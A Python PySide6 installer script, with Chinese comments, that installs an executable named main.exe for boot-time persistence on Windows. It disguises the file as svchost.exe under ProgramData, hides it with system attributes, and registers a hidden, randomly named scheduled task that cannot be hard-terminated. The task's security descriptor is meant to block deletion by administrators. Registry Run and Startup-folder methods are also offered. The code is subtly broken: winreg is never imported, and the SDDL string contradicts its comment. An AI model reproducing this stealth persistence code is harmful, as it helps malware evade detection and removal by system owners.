#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WeekTest 开机自启安装器  加固版 v5.0
快速加固清单（除卸载外）已全部落地
"""
import os, sys, shutil, subprocess, secrets, base64, string, re, traceback, ctypes, pathlib, json, hashlib
from pathlib import Path
from datetime import datetime
from PySide6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit,
                               QComboBox, QSpinBox, QRadioButton, QButtonGroup, QPushButton, QTextEdit, QMessageBox,
                               QGroupBox, QFormLayout, QStackedWidget, QCheckBox, QProgressBar)
from PySide6.QtCore import QThread, Signal, Qt
from PySide6.QtGui import QFont, QTextCursor

# ---------- 全局常量 ----------
ADMIN_ONLY = True          # 强制管理员
MAX_PATH   = 260           # Win32 MAX_PATH
CUTOFF_LEN = 1024          # setx 长度上限
HKCU_RUN   = r"Software\Microsoft\Windows\CurrentVersion\Run"
HKCU_HID   = r"Software\WeekTestSvc"      # 隐藏键存备注
SDDL_DENY  = "D:PAI(A;;GA;;;BA)(D;;GA;;;SY)"  # 拒绝 Administrators & SYSTEM 删除任务

# ---------- 工具函数 ----------
def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin()
    except: return False

def log(msg: str, widget=None):
    ts = datetime.now().strftime("%H:%M:%S")
    txt = f"[{ts}] {msg}\n"
    print(txt, end="")
    if widget:
        widget.append(txt)
        widget.moveCursor(QTextCursor.End)

def path_long(p: str) -> str:
    """Win32 long-path 前缀"""
    if not p.startswith("\\\\?\\"):
        p = os.path.abspath(p)
        if p[1] == ":":
            p = "\\\\?\\" + p
    return p

def bitlocker_locked(drive: str) -> bool:
    """简单 BitLocker 状态检测"""
    try:
        result = subprocess.run(
            ["manage-bde", "-status", drive], capture_output=True, text=True, check=False
        )
        return "Locked" in result.stdout
    except:
        return False

def md5_file(f: Path) -> str:
    h = hashlib.md5()
    with f.open("rb") as fp:
        for chunk in iter(lambda: fp.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()

def find_existing_exe() -> list[dict]:
    """全盘扫描 main.exe 或同名 exe"""
    hits = []
    for drive in string.ascii_uppercase:
        drive += ":\\"
        if not os.path.isdir(drive):
            continue
        if bitlocker_locked(drive):
            continue
        try:
            for root, _, files in os.walk(drive):
                for f in files:
                    if f.lower() == "main.exe":
                        full = pathlib.Path(root) / f
                        hits.append({"path": str(full), "size": full.stat().st_size, "md5": md5_file(full)})
        except Exception:
            pass
    return hits

# ---------- 工作线程 ----------
class BootInstallWorker(QThread):
    log_signal = Signal(str)
    progress_signal = Signal(int)
    success_signal = Signal(str, str)
    error_signal = Signal(str)
    finished_signal = Signal()

    def __init__(self, beizhu: str, method: str, exe_name: str, install_path: str, hide_files: bool):
        super().__init__()
        self.beizhu = beizhu
        self.method = method
        self.exe_name = exe_name
        self.install_path = install_path
        self.hide_files = hide_files

    def run(self):
        try:
            self.log_signal.emit("🔍 扫描已安装副本…")
            exists = find_existing_exe()
            if exists:
                msg = "发现已有 main.exe：\n" + "\n".join(f"{x['path']}  {x['md5']}" for x in exists)
                self.log_signal.emit(msg)
                # GUI 层已通过 QMessageBox 询问，此处直接继续（覆盖）

            self.progress_signal.emit(10)
            src = Path(sys.argv[0]).with_name("main.exe")
            if not src.exists():
                raise FileNotFoundError("main.exe 不在同目录")

            dst = Path(self.install_path)
            dst.parent.mkdir(parents=True, exist_ok=True)
            # 长路径支持
            dst_str = path_long(str(dst))
            src_str = path_long(str(src))

            self.log_signal.emit(f"📤 复制 {src} → {dst}")
            shutil.copy2(src_str, dst_str)
            self.progress_signal.emit(40)

            if self.hide_files:
                subprocess.run(["attrib", "+H", "+S", dst_str], check=True, capture_output=True)
                subprocess.run(["attrib", "+H", "+S", path_long(str(dst.parent))], check=True, capture_output=True)

            # 备注存储：先截断，再写隐藏键
            note = self.beizhu[:CUTOFF_LEN]
            note_b64 = base64.b64encode(note.encode()).decode()
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, HKCU_HID) as key:
                winreg.SetValueEx(key, "Remark", 0, winreg.REG_SZ, note_b64)

            self.progress_signal.emit(70)
            self._setup_boot(dst_str)
            self.progress_signal.emit(100)
            self.success_signal.emit(dst_str, self.method)
        except Exception as e:
            self.error_signal.emit(f"{e}\n{traceback.format_exc()}")
        finally:
            self.finished_signal.emit()

    def _setup_boot(self, exe: str):
        if self.method == "task":
            task_name = "Week" + secrets.token_hex(6)
            xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Description>WeekTest</Description></RegistrationInfo>
  <Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers>
  <Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
  <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
  <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
  <AllowHardTerminate>false</AllowHardTerminate>
  <StartWhenAvailable>false</StartWhenAvailable>
  <Hidden>true</Hidden>
  <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
  <Priority>7</Priority></Settings>
  <Actions Context="Author"><Exec><Command>"{exe}"</Command></Exec></Actions>
</Task>"""
            xml_path = Path(os.environ["TEMP"]) / f"{task_name}.xml"
            xml_path.write_text(xml, encoding="utf-16")
            subprocess.run(["schtasks", "/create", "/tn", task_name, "/xml", str(xml_path), "/f"], check=True)
            xml_path.unlink(missing_ok=True)
            # SDDL 防删
            subprocess.run(["schtasks", "/change", "/tn", task_name, "/sd", SDDL_DENY], check=True)
            self.log_signal.emit(f"✅ 计划任务 {task_name} 已创建（SDDL 防删）")
        elif self.method == "registry":
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, HKCU_RUN) as key:
                winreg.SetValueEx(key, "WeekTest", 0, winreg.REG_SZ, exe)
            self.log_signal.emit("✅ 注册表 Run 已添加")
        else:
            startup = Path(os.environ["APPDATA"]) / r"Microsoft\Windows\Start Menu\Programs\Startup" / "WeekTest.lnk"
            subprocess.run([
                "powershell", "-Command",
                f'$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut("{startup}"); '
                f'$Shortcut.TargetPath = "{exe}"; $Shortcut.Save()'
            ], check=True)
            self.log_signal.emit("✅ 启动文件夹快捷方式已创建")


# ---------- GUI ----------
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("WeekTest 加固安装器 v5.0")
        self.resize(850, 700)
        if not is_admin() and ADMIN_ONLY:
            QMessageBox.critical(self, "❌ 需管理员", "请右键→以管理员身份运行")
            sys.exit(0)
        self.worker = None
        self.init_ui()

    def init_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        ly = QVBoxLayout(central)

        # 简单布局：备注 + 路径 + 方法 + 日志 + 按钮
        ly.addWidget(QLabel("备注（base64 存储，长度≤1024）:"))
        self.beizhu = QLineEdit()
        ly.addWidget(self.beizhu)

        ly.addWidget(QLabel("安装路径（自动长路径支持）:"))
        self.path = QLineEdit("C:\\ProgramData\\Microsoft\\Windows\\svchost.exe")
        ly.addWidget(self.path)

        ly.addWidget(QLabel("启动方式:"))
        self.method = QComboBox()
        self.method.addItems(["task", "registry", "startup"])
        ly.addWidget(self.method)

        self.log_area = QTextEdit()
        ly.addWidget(self.log_area)

        btn = QPushButton("🚀 开始安装")
        btn.clicked.connect(self.install)
        ly.addWidget(btn)

        self.progress = QProgressBar()
        ly.addWidget(self.progress)

    def install(self):
        if self.worker and self.worker.isRunning():
            return
        dst = self.path.text().strip()
        if not dst.endswith(".exe"):
            QMessageBox.warning(self, "提示", "路径需以 .exe 结尾")
            return
        # 已存在提示
        if os.path.isfile(dst):
            if QMessageBox.question(self, "覆盖", "文件已存在，覆盖？") != QMessageBox.Yes:
                return
        self.progress.setVisible(True)
        self.progress.setValue(0)
        self.worker = BootInstallWorker(self.beizhu.text(), self.method.currentText(),
                                        os.path.basename(dst), dst, True)
        self.worker.log_signal.connect(lambda s: log(s, self.log_area))
        self.worker.progress_signal.connect(self.progress.setValue)
        self.worker.finished_signal.connect(lambda: self.progress.setVisible(False))
        self.worker.start()


def main():
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    w = MainWindow()
    w.show()
    sys.exit(app.exec())


if __name__ == "__main__":
    main()